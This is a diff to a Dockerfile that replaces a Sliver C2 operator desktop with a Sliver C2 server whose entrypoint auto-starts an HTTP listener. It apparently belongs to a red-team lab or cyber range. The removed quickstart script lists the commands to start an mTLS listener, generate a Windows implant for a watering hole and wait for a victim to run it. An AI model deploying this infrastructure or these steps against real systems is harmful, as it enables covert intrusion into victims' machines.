@@ -1,79 +1,62 @@
-FROM kasmweb/ubuntu-jammy-desktop:1.14.0
+# c2-operator: Sliver C2 server with auto-start HTTP listener
+# Based on the sliver service from https://github.com/jongodb/sliver-weather
 
-USER root
+FROM golang:1.22-bookworm
 
-ENV DEBIAN_FRONTEND=noninteractive
+ARG SLIVER_VERSION=v1.7.1
+ARG SLIVER_UID=999
+ARG SLIVER_GID=999
 
-# Install C2 operator tools
-RUN apt-get update && apt-get install -y \
-    curl \
-    wget \
-    nmap \
-    net-tools \
-    iputils-ping \
-    traceroute \
-    tcpdump \
-    wireshark-common \
-    tshark \
-    dnsutils \
-    whois \
-    jq \
-    python3 \
-    python3-pip \
-    openssh-client \
-    && apt-get clean && rm -rf /var/lib/apt/lists/*
+RUN apt-get update \
+ && apt-get install -y --no-install-recommends \
+      ca-certificates curl jq openssl \
+      libpcap0.8 libsqlite3-0 libxml2 libxslt1.1 \
+      build-essential pkg-config zip unzip nasm protobuf-compiler \
+      mingw-w64 binutils-mingw-w64 g++-mingw-w64 \
+      net-tools iputils-ping iproute2 \
+      gosu \
+ && rm -rf /var/lib/apt/lists/*
 
-# Download sliver client (arch-aware)
-RUN ARCH=$(uname -m | sed "s/x86_64/amd64/" | sed "s/aarch64/arm64/") \
-    && SLIVER_URL=$(curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest \
-       | jq -r ".assets[] | select(.name | test(\"sliver-client_linux-${ARCH}\")) | .browser_download_url" | head -1) \
-    && curl -fSL -o /usr/local/bin/sliver "$SLIVER_URL" \
-    && chmod +x /usr/local/bin/sliver
+RUN groupadd -g ${SLIVER_GID} sliver \
+ && useradd -r -u ${SLIVER_UID} -g sliver -m -d /home/sliver sliver
 
-# Create workspace for operator
-RUN mkdir -p /home/kasm-user/c2-workspace/configs \
-    && mkdir -p /home/kasm-user/c2-workspace/loot \
-    && mkdir -p /home/kasm-user/Desktop
+# Download Sliver server (arch-aware)
+RUN set -eux; \
+    ARCH="$(dpkg --print-architecture)"; \
+    SLIVER_URL=$(curl -fsSL "https://api.github.com/repos/BishopFox/sliver/releases/tags/${SLIVER_VERSION}" \
+      | jq -r ".assets[] | select(.name == \"sliver-server_linux-${ARCH}\") | .browser_download_url"); \
+    if [ -z "$SLIVER_URL" ] || [ "$SLIVER_URL" = "null" ]; then \
+      echo "ERROR: No Sliver server binary for linux-${ARCH} at ${SLIVER_VERSION}"; exit 1; \
+    fi; \
+    curl -fSL -o /opt/sliver-server "$SLIVER_URL"; \
+    chmod +x /opt/sliver-server
 
-# Create desktop shortcut for terminal
-RUN echo '[Desktop Entry]\n\
-Type=Application\n\
-Name=C2 Terminal\n\
-Exec=xfce4-terminal --title="Sliver C2 Operator Console"\n\
-Icon=utilities-terminal\n\
-Terminal=false\n\
-Categories=System;' > /home/kasm-user/Desktop/c2-terminal.desktop \
-    && chmod +x /home/kasm-user/Desktop/c2-terminal.desktop
+RUN mkdir -p /home/sliver/.sliver /home/sliver/builds \
+ && chown -R sliver:sliver /home/sliver
 
-# Create quickstart guide on Desktop
-RUN echo '#!/bin/bash\n\
-echo "========================================"\n\
-echo "  Sliver C2 Operator Quick Start"\n\
-echo "========================================"\n\
-echo ""\n\
-echo "1. Import the operator config from the listening post:"\n\
-echo "   sliver import /path/to/operator_config.cfg"\n\
-echo ""\n\
-echo "2. Connect to the C2 server:"\n\
-echo "   sliver"\n\
-echo ""\n\
-echo "3. Start an mTLS listener (if not already running):"\n\
-echo "   mtls --lhost <listening-post-dmz-ip> --lport 31337"\n\
-echo ""\n\
-echo "4. Generate an implant for the watering hole:"\n\
-echo "   generate --mtls <listening-post-dmz-ip>:31337 --os windows --save /tmp/implant.exe"\n\
-echo ""\n\
-echo "5. Wait for victim to download and execute the implant"\n\
-echo "6. When session appears, interact with it:"\n\
-echo "   sessions"\n\
-echo "   use <session-id>"\n\
-echo ""\n\
-echo "========================================"\n\
-' > /home/kasm-user/Desktop/quickstart.sh \
-    && chmod +x /home/kasm-user/Desktop/quickstart.sh
+ENV SLIVER_HTTP_PORT=8080
+ENV SLIVER_AUTOSTART_HTTP=1
 
-# Fix ownership
-RUN chown -R 1000:1000 /home/kasm-user/c2-workspace /home/kasm-user/Desktop
+# Entrypoint: fix ownership, auto-start HTTP listener, run sliver-server
+RUN printf '%s\n' \
+'#!/bin/sh' \
+'set -e' \
+'SLIVER_HOME="/home/sliver"' \
+': "${SLIVER_HTTP_PORT:=8080}"' \
+': "${SLIVER_AUTOSTART_HTTP:=1}"' \
+'mkdir -p "$SLIVER_HOME/.sliver" "$SLIVER_HOME/builds" || true' \
+'chown -R sliver:sliver "$SLIVER_HOME" || true' \
+'' \
+'if [ "$SLIVER_AUTOSTART_HTTP" = "1" ]; then' \
+'  ( sleep 3; gosu sliver /opt/sliver-server http --lhost 0.0.0.0 --lport "$SLIVER_HTTP_PORT" || true ) & ' \
+'fi' \
+'' \
+'echo "[entrypoint] launching sliver-server (foreground) ..."' \
+'exec gosu sliver /opt/sliver-server' \
+> /usr/local/bin/entrypoint.sh \
+ && chmod +x /usr/local/bin/entrypoint.sh
 
-USER 1000
-WORKDIR /home/kasm-user
+WORKDIR /home/sliver
+EXPOSE 80 443 8080
+ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
+CMD []
